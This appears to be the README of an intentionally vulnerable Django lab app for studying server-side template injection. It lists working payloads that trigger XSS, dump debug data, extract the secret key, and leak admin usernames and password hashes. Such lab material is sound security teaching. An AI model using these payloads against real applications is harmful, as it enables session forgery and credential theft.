# Django App Vulnerable to Django Templates SSTI

This simple Django app serves to show post-exploitation options when server-side template injection (SSTI) is present in app using Django Templates engine (not Jinja2 but might work there as well).

## Run
To run the project, working Docker installation is required. With this prerequisite the project can be executed as follows:
```
sudo docker build -t django .
sudo docker run --rm -p 127.0.0.1:8000:8000 django
```

Now the example application should be running and accepting SSTI payloads at: `http://localhost:8000/polls/?injection=`

## Example payloads
Cross-site scripting:
```
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

Debug information leak:
```
{% debug %}
```

Leaking app’s Secret Key (assumes CookieStorage being first message storage):
```
{{ messages.storages.0.signer.key }}
```

Admin Site URL leak:
```
{% include 'admin/base.html' %}
```

Admin username & password hash leak (assumes `admin_log` records exist):
```
{% load log %}{% get_admin_log 10 as log %}{% for e in log %} {{e.user.get_username}} : {{e.user.password}}{% endfor %}
```
